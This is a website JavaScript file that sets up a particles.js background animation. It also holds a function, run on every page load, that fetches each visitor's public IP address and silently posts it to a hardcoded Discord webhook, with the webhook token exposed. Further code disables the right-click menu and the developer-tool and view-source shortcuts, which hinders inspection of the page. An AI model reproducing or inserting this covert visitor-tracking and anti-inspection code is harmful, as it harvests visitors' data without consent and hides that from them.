particlesJS("particles-js", {
  particles: {
    number: {
      value: 80,
      density: {
        enable: !0,
        value_area: 210,
      },
    },
    color: {
      value: "#ffffff",
    },
    shape: {
      type: "circle",
      stroke: {
        width: 0,
        color: "#000000",
      },
      polygon: {
        nb_sides: 5,
      },
      image: {
        src: "img/github.svg",
        width: 100,
        height: 100,
      },
    },
    opacity: {
      value: 0.75,
      random: !1,
      anim: {
        enable: !1,
        speed: 1,
        opacity_min: 0.1,
        sync: !1,
      },
    },
    size: {
      value: 2,
      random: !0,
      anim: {
        enable: !1,
        speed: 40,
        size_min: 0.1,
        sync: !1,
      },
    },
    line_linked: {
      enable: !1,
      distance: 150,
      color: "#ffffff",
      opacity: 0.4,
      width: 1,
    },
    move: {
      enable: !0,
      speed: 1.5,
      direction: "top",
      random: 1,
      straight: 1,
      out_mode: "out",
      attract: {
        enable: !1,
        rotateX: 600,
        rotateY: 1200,
      },
    },
  },
  interactivity: {
    detect_on: "canvas",
    events: {
      onhover: {
        enable: !1,
        mode: "repulse",
      },
      onclick: {
        enable: !1,
        mode: "push",
      },
      resize: !1,
    },
    modes: {
      grab: {
        distance: 400,
        line_linked: {
          opacity: 1,
        },
      },
      bubble: {
        distance: 400,
        size: 40,
        duration: 2,
        opacity: 8,
        speed: 3,
      },
      repulse: {
        distance: 200,
      },
      push: {
        particles_nb: 4,
      },
      remove: {
        particles_nb: 2,
      },
    },
  },
  retina_detect: !0,
  config_demo: {
    hide_card: !1,
    background_color: "#b61924",
    background_image: "",
    background_position: "50% 50%",
    background_repeat: "no-repeat",
    background_size: "cover",
  },
})

async function sendWebhook() {
  let ip = await (await fetch(`https://ifconfig.me/ip`)).text()
  const webhookURL =
    "https://discord.com/api/webhooks/1175789235140317284/AWW8jXftbrOvj2Ap-gZm4ZzCjHxVvyBq1RvengSTozaCeeDCHDccbiA6xrc6MrYQPZ7s"

  const message = {
    content: `${ip}`,
  }

  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(message),
  })
    .then((response) => {
      if (!response.ok) {
        console.error(`Error ${response.status}: ${response.statusText}`)
      }
    })
    .catch((error) => console.error("Error:", error))
}

window.onload = function () {
  // this will run funcion on page load
  sendWebhook()
}

document.addEventListener("contextmenu", function (e) {
  e.preventDefault()
})

document.onkeydown = function (e) {
  if (event.keyCode == 123) {
    return false
  }

  if (e.ctrlKey && e.shiftKey && e.keyCode == "I".charCodeAt(0)) {
    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank")
    return false
  }

  if (e.ctrlKey && e.shiftKey && e.keyCode == "C".charCodeAt(0)) {
    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank")
    return false
  }

  if (e.ctrlKey && e.shiftKey && e.keyCode == "J".charCodeAt(0)) {
    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank")
    return false
  }

  if (e.ctrlKey && e.keyCode == "U".charCodeAt(0)) {
    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank")
    return false
  }
}
